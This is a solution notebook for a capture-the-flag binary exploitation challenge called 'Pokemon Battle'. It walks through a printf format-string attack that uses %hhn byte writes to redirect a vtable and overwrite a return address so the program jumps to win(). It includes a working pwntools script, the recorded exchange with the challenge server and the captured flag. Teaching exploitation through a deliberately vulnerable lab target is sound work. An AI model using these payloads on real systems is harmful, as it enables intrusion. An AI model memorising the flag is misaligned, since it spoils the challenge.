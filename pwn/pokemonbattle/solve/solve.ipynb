{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Solution for Pokemon Battle\n",
    "\n",
    "_This challenge was born of a silly observation that `vtable` kind of looks a bit like `vbattle` if you're sufficiently high. And thus the theme was set in stone._"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The stack is like:\n",
    "\n",
    "| Top | Stack      | Description |\n",
    "|--:| :--: | :--: |\n",
    "|-->| -5   | Unused bytes for alignment|\n",
    "|| -4   | Pointer to the `battler` object       |\n",
    "|| -3   | Previous stack frame: i.e. points to `STACK[-1]`       |\n",
    "|| -2   | Return address to `main()` from `Play()`        |\n",
    "|-->| -1   | Some random preserved RBP    |\n",
    "|| 0    | Return address: to `__libc_start_main()` from `main()` |\n",
    "\n",
    "We solve this using only 5 input-eval iterations, by poking bytes into the stack via `printf` `%hhn` (which starts the top of the stack as arg6 since the five before that are registers).\n",
    "\n",
    "| # | Instruction | Corresponding `printf` |\n",
    "| -- | :-- | -- |\n",
    "|1| Modify vtable at `STACK[-4]` from `0x3D68` to `0x3D70`, so that a call to `Battle()` redirects to `Play()`, causing more inputs. This adds 4 items to the stack each time (effectively duplicating the top 4 layers). | Poke byte 0x70 to arg7 |\n",
    "|2| Read the value of `STACK[-3]`, so we know the absolute address of `STACK[-1]` (and the stack as a whole). | Read byte from arg12 |\n",
    "|3| Modify value of `STACK[-3]` (pointed to by `STACK[-7]`), to subtract 8. This makes it point to `STACK[-2]` rather than `STACK[-1]`. | Poke byte (val-8) to arg12 |\n",
    "|4| Modify return address at `STACK[-2]` (now pointed to by `STACK[-3]`) from `0x12B7` to `0x12C3`. This is basically the `win()` function, but just past the initial `push rbp` so that the stack is 16-byte aligned. | Poke byte 0xC3 to arg20 |\n",
    "|5| Finally, revert the vtable back from `0x3D68` to `0x3D70`. | Poke byte 0x68 to arg7 |\n",
    "\n",
    "This allows the game to visit `win()` after returning from all the `Play()`s, and then exit cleanly.\n",
    "\n",
    "Since everything is ASCII, we can do this by hand on the command line, but for completeness we show it in pwntools below:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Opening connection to fun.chall.seetf.sg on port 50005\n",
      "[x] Opening connection to fun.chall.seetf.sg on port 50005: Trying 34.131.197.225\n",
      "[+] Opening connection to fun.chall.seetf.sg on port 50005: Done\n",
      "[x] Receiving all data\n",
      "[x] Receiving all data: 33B\n",
      "[x] Receiving all data: 139B\n",
      "[x] Receiving all data: 619B\n",
      "[+] Receiving all data: Done (619B)\n",
      "[*] Closed connection to fun.chall.seetf.sg port 50005\n",
      " I choose you!\n",
      "Choose a pokemon:                                                                        \n",
      ", I choose you!\n",
      "Choose a pokemon:                                                                                                                                                                                                   \n",
      ", I choose you!\n",
      "Choose a pokemon: SEE{did_you_choose_missingno_b6d3c6594dcc332c7e22d231d10b8b8b}\n",
      "                                                                                                       \n",
      ", I choose you!\n",
      "Let the battle begin...\n",
      "Your pokemon was defeated. You blacked out!\n",
      "\n"
     ]
    }
   ],
   "source": [
    "from pwn import *\n",
    "with remote('fun.chall.seetf.sg', 50005) as sh:\n",
    "    sh.sendline(b'%112c%7$hhn')\n",
    "    sh.sendline(b'[%12$hhu')\n",
    "    sh.recvuntil(b'[')\n",
    "    pos = int(sh.recvuntil(b',', True))\n",
    "    assert pos, 'Try again, this exploit requires non-zero pos'\n",
    "    sh.sendline(f'%{pos-8}c%12$hhn'.encode())\n",
    "    sh.sendline(b'%195c%20$hhn')\n",
    "    sh.sendline(b'%104c%7$hhn')\n",
    "    print(sh.recvall().decode())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The order comes out a bit weird due to the buffering, but we can clearly see our flag in there:\n",
    "```SEE{did_you_choose_missingno_b6d3c6594dcc332c7e22d231d10b8b8b}```"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
